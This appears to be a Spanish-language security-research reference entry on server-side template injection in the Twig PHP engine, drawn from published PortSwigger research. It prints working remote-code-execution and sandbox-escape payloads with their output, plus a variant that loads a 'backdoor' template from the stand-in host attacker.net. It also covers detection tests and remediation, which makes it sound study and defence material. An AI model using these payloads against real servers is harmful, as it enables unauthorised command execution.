---
clase: inyeccion
tech: twig
cwe: CWE-1336
cvss: 9.8 # [derivado] RCE; corregido en Twig 1.20.0 segun la fuente
payload: |
  # PAYLOAD DE RCE - LITERAL de la fuente:
  {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
  #
  # Salida LITERAL que muestra la fuente:
  #   uid=1000(k) gid=1000(k) groups=1000(k),10(wheel)
  #
  # Mecanica, visible en el codigo fuente que cita la fuente: getFilter() recorre los
  # callbacks de filtro registrados y los invoca con call_user_func(). Registrando
  # 'exec' como callback de filtros no definidos, pedir el filtro "id" ejecuta exec("id").
  #
  # Fragmento LITERAL del codigo de Twig que da la fuente:
  #   public function getFilter($name)   {           [snip]           foreach ($this->filterCallbacks as $callback) {           if (false !== $filter = call_user_func($callback, $name)) {               return $filter;           }       }       return false;   }      public function registerUndefinedFilterCallback($callable)   {       $this->filterCallbacks[] = $callable;   }
  #
  # ---- ESCAPE DEL SANDBOX DE TWIG ----
  # Payload LITERAL de la fuente:
  {{_self.displayBlock("id",[],{"id":[userObject,"vulnerableMethod"]})}}
  #
  # Por que funciona, segun el codigo que cita la fuente: checkMethodAllowed() DEVUELVE
  # TRUE para cualquier objeto que sea Twig_TemplateInterface o Twig_Markup, asi que
  # _self (la propia plantilla) esquiva la lista blanca de metodos.
  #   public function checkMethodAllowed($obj, $method)   {     if ($obj instanceof Twig_TemplateInterface || $obj instanceof Twig_Markup) {           return true;       }
  #
  # ---- VARIANTE QUE LA FUENTE DESCARTA ----
  {{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
  # La fuente aclara que NO sirve donde allow_url_include esta deshabilitado.
precondicion: "SSTI confirmada en Twig. Para el primer payload, Twig anterior a 1.20.0 (la fuente indica 'Fixed in 1.20.0'). Para el escape de sandbox, que la aplicacion use el sandbox de Twig creyendolo una frontera de seguridad. La variante setCache requiere allow_url_include habilitado, que la fuente señala como poco frecuente."
como_se_descubre: |
  Tras identificar Twig (con {{7*'7'}} -> 49, ver ssti-identificacion-twig-vs-jinja2),
  '_self' es el objeto clave: da acceso al entorno de la plantilla y de ahi a metodos
  que no estan pensados para ser alcanzables desde una plantilla.
  La leccion de metodologia que la fuente formaliza en su fase 'Exploit' es de tres
  pasos: 'Read' (leer la documentacion del motor), 'Explore' (enumerar objetos,
  incluido self) y 'Attack' (revisar las funciones buscando comportamiento
  explotable). No es fuerza bruta de payloads: es lectura de la API del motor buscando
  cualquier funcion que invoque codigo.
control_negativo: |
  # [derivado] diseño de test A/B
  # A: {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
  #    -> salida de 'id' = RCE
  # B: {{_self.env}}  -> devuelve algo (no error) = _self.env es alcanzable
  # El par B es el corte temprano: si _self.env da error, la version esta parcheada o
  # el sandbox lo bloquea, y no merece la pena construir el payload completo.
  # C: {{7*'7'}} -> 49, para confirmar que el motor es Twig y no Jinja2
mata: |
  - Twig 1.20.0 o posterior -> el primer payload esta corregido.
  - El sandbox de Twig con un SecurityPolicy estricto que no permita _self.
  - allow_url_include deshabilitado -> muere la variante setCache (lo habitual).
  - El motor es Jinja2 y no Twig (ver control C): toda la sintaxis cambia.
fuente: "https://portswigger.net/research/server-side-template-injection (James Kettle, 2015-08-05, act. 2025-09-03). Payloads, salida y fragmentos de codigo de Twig literales. Estado segun la fuente: 'Fixed in 1.20.0'. Sin CVE ni recompensa indicados. ADVERTENCIA: el render colapso los saltos de linea del codigo; el extracto de displayBlock de la fuente esta cortado en '} catch (Twig_Error $e) {'."
confianza: alta
fecha: 2026-11-02
---
# [INYECCIÓN] SSTI en Twig — `registerUndefinedFilterCallback` convierte un filtro en `call_user_func`

## Principio
Twig permite registrar un callback para los filtros no definidos. Internamente,
`getFilter()` recorre esos callbacks y los invoca con `call_user_func()`. Así que
registrar `exec` como callback y después pedir un filtro llamado `"id"` ejecuta
`exec("id")`.

Nada de esto es un desbordamiento ni un escape exótico: es la API documentada del motor,
usada en el orden que el atacante elige. Es el patrón que recorre todo el material de
SSTI — el motor de plantillas **es** un intérprete, y la superficie de ataque es su
API completa.

## Payload
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

Salida literal de la fuente:

```
uid=1000(k) gid=1000(k) groups=1000(k),10(wheel)
```

El código de Twig que lo hace posible, citado por la fuente:

```php
public function getFilter($name)   {           [snip]           foreach ($this->filterCallbacks as $callback) {           if (false !== $filter = call_user_func($callback, $name)) {               return $filter;           }       }       return false;   }
```

## El escape del sandbox
```
{{_self.displayBlock("id",[],{"id":[userObject,"vulnerableMethod"]})}}
```

Funciona por una razón concreta y visible en el código: `checkMethodAllowed()`
**devuelve `true`** para cualquier objeto que sea `Twig_TemplateInterface` o
`Twig_Markup`. Y `_self` es la propia plantilla, así que es `Twig_TemplateInterface` —
el sandbox lo exime de su propia lista blanca de métodos.

```php
public function checkMethodAllowed($obj, $method)   {     if ($obj instanceof Twig_TemplateInterface || $obj instanceof Twig_Markup) {           return true;       }
```

Es un ejemplo limpio de por qué la fuente dice que los sandboxes a nivel de parser son
propensos a error: la excepción que el sandbox se concede a sí mismo es la puerta.

## Una variante que la fuente descarta
```
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
```

La fuente aclara que **no sirve** donde `allow_url_include` está deshabilitado, que es
lo habitual. La incluyo marcada porque circula como payload de SSTI de Twig sin esa
advertencia, y gastar tiempo en ella es un error evitable.

## Metodología que la fuente formaliza
Su fase `Exploit` tiene tres pasos: **Read** (leer la documentación del motor),
**Explore** (enumerar objetos, incluido `self`) y **Attack** (revisar las funciones
buscando comportamiento explotable). No es fuerza bruta de payloads: es lectura de la API
buscando cualquier función que invoque código — `call_user_func`, `eval`, `exec`,
`new`, `include`.

## Impacto
Ejecución remota de comandos. Estado según la fuente: corregido en **Twig 1.20.0**.

## Remediación
De OWASP, aplicable aquí: dar al sandbox su propio entorno y un `SecurityPolicy`
estricto que liste explícitamente las etiquetas, filtros, funciones, tests, métodos y
propiedades permitidos; no permitir nunca `template_from_string()` en plantillas
sandboxeadas. Y la regla general del paper: no construir plantillas a partir de datos no
confiables.
